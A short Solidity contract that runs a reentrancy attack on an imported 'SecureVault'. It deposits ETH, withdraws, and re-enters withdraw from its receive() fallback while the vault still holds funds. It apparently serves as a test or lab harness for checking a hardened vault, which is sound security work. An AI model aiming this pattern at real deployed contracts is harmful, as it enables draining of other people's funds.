// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "./SecureVault.sol";

contract SecureAttacker {

    SecureVault public vault;
    uint256 public attackAmount;

    constructor(address _vault) {
        vault = SecureVault(_vault);
    }

    function attack() external payable {
        require(msg.value > 0, "Send ETH");

        attackAmount = msg.value;

        vault.deposit{value: msg.value}();

        vault.withdraw();
    }

    receive() external payable {
        if (address(vault).balance >= attackAmount) {
            vault.withdraw();
        }
    }
}
